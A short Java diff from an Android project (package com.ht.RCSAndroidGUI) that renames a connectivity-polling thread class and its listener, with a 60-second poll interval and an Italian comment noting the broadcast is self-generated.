@@ -9,14 +9,14 @@ import com.ht.RCSAndroidGUI.Connectivity;
 import com.ht.RCSAndroidGUI.Status;
 
 // Falso broadcast, e' generato da noi
-public class ConnectivityBroadcastMonitor extends Thread {
+public class BroadcastMonitorConnectivity extends Thread {
 	/** The Constant TAG. */
 	private static final String TAG = "ConnectivityBroadcastMonitor";
 
 	private boolean stop;
 	private int period;
 
-	public ConnectivityBroadcastMonitor() {
+	public BroadcastMonitorConnectivity() {
 		stop = false;
 		period = 60000; // Poll interval
 	}
@@ -46,7 +46,7 @@ public class ConnectivityBroadcastMonitor extends Thread {
 	}
 
 	public void onReceive(boolean isConnected) {
-		ConnectivityListener.self().dispatch(new Connectivity(isConnected));
+		ListenerConnectivity.self().dispatch(new Connectivity(isConnected));
 	}
 
 	void register() {
